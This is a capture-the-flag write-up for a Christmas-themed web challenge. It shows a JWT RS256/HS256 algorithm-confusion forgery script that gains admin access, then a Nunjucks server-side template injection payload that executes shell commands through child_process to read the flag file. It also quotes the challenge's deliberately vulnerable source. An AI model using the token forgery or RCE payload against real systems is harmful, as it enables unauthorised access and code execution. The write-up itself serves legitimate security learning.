From experience I know that Base64 encoded JSON strings start with `ey` so this is most likely a [JSON Web Token (JWT)](https://jwt.io/).

We can decode our token at https://jwt.io to better understand the structure:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.006.png)

So we can see the algorithm that was used to sign our token is `RS256` and there are three data fields `username`, `pk`, and `iat` (issued at). The public key field is interesting, so since we're given the source code we can take a look at `/challenge/helpers/JWTHelper.js` to better understand how the tokens are created:

```javascript
const jwt = require('jsonwebtoken');
const NodeRSA = require('node-rsa');

const keyPair = new NodeRSA({b: 512}).generateKeyPair();
const publicKey = keyPair.exportKey('public')
const privateKey = keyPair.exportKey('private')

module.exports = {
	async sign(data) {
		data = Object.assign(data, {pk:publicKey});
		return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
	},
	async verify(token) {
		return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
	}
}
```

Parsing the code, we can see that a public and private key pair are generated. The public key is used in the `pk` data field as shown before and then the token is signed with the private key. This is all normal asymmetric encryption and is fine. 

The vulnerability exists within the `verify()` function. There isn't just one algorithm that is valid to verify the token but two, `RS256` and `HS256`. 

If we take a look at the [documentation](https://www.npmjs.com/package/jsonwebtoken) for the `jwt.verify()` function we can see the issue with this:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.014.png)

So because the JWT can be verified with either `RS256` or `HS256`, we can simply create our own `HS256` signed JWT with the public key used as the secret and this will pass the `verify()` function.

In order to do this, I had to install an older version of the [PyJWT](https://pyjwt.readthedocs.io/en/stable/) library, as there is now a check in the code to ensure you do not accidentally set the secret for a `HS256` token to a public key (good job dev!):

`pip3 install pyjwt==0.4.3`

Now we can craft a simple python script that will create a `HS256` signed JWT where the `username` field is set to `admin` and the secret is the public key we extracted from our original token:

```python
import jwt

publickey = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzGadvwMfo5C3FIp2yyrT\nvzqVanevrOVnCV6F6BYE68iUVxKFvQuhgE8tn1qedGV50YbdoG5inhoZUnVZRmTX\nHDxpCsaOBHixYJl+D+IjUwWDJjLff4WH3Ijaoy5aG+hGW4TDTBaOVjI/9Xv7qk9U\nf39iUDqAU0NGN/wMQJhOEXGe6bTW41xuHELyyOqSt4aEkhsv5nTIFtfr5pqaughk\nerz/uUnjKErzY2DxwOfbUckBu2IM5Vxc1LLBozvuKb4mTco+wDjpYWvt+umDyVvg\nZTCFAq37il/QuO/tbpDaI5t0ifG/VwuBqyOdATqdrx1BaRsII7R7XxoJAOiDwSah\nqQIDAQAB\n-----END PUBLIC KEY-----"

encoded = jwt.encode({"username": "admin", "pk":publickey, 'iat':1638858006}, publickey, algorithm="HS256")
print(encoded)
```

Running the script, we successfully generate a new JWT token. Editing our cookie to use this token, we login as the admin user and can see the dashboard:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.007.png)

Here we can edit the information for the elves such as their name and whether they are naughty or nice. This information is then used to generate the letter on the front page that we saw earlier. Let's take a look at the `/challenge/helper/CardHelper.js` file to understand how the card is generated:

{% raw %}
```javascript
const nunjucks   = require('nunjucks');

module.exports = {
	async generateCard(elfList) {
		return new Promise(async (resolve, reject) => {
			try {
				let NaughtyNames = NiceNames = '<br>';
				for(elfData of elfList) {
					if (elfData.type == 'naughty') {
						NaughtyNames = `${NaughtyNames}\n${elfData.elf_name}<br>`;
					}
					else if (elfData.type == 'nice') {
						NiceNames = `${NiceNames}\n${elfData.elf_name}<br>`;
					}
				}
				card = `
					{% extends "card.html" %}
					{% block card %}
					<div class="card">
						<div class="card-page cart-page-front">
							<div class="card-page cart-page-outside"></div>
							<div class="card-page cart-page-inside">
							<p><span class='nheader green'>Nice List</span>
								${NiceNames}
							</p>
							</div>
						</div>
						<div class="card-page cart-page-bottom">
							<p><span class='nheader red'>Naughty List</span>
								${NaughtyNames}
							</p>
						</div>
					</div>
					{% endblock %}
				`;
				resolve(nunjucks.renderString(card));
			} catch(e) {
				reject(e);
			}
		})
	}
};
```
{% endraw %}

As expected, the function simply parses which elves are naughty or nice and displays them on their respective side of the list using the Nunjucks templating engine. The vulnerability here lies within the fact that we're able to control the data that is passed into nunjucks leading to [Server Side Template Injection (SSTI)](https://portswigger.net/research/server-side-template-injection).

We can verify this vulnerability by trying a payload like the following:

{% raw %}
`{{7*7}}`
{% endraw %}

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.008.png)

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.009.png)

As you can see, the output is `49` which means we have successfully executed code.

Now we just need to craft a payload that will let us execute arbitrary commands on the web server. After a bit of [research](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine), this is a payload that will execute the `ls /` command:

{% raw %}
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('ls /')")()}}
```
{% endraw %}

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.010.png)

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.011.png)

And there's the `flag.txt`! Now all we have to do is edit our payload to `cat /flag.txt`

{% raw %}
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
```
{% endraw %}

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.012.png)

And there's the flag, but it's a bit hard to read so we can simply look at the page source:

![](/assets/img/writeups/CyberSanta2021/naughtynice%20Writeup.013.png)

Nice!

### Flag: HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}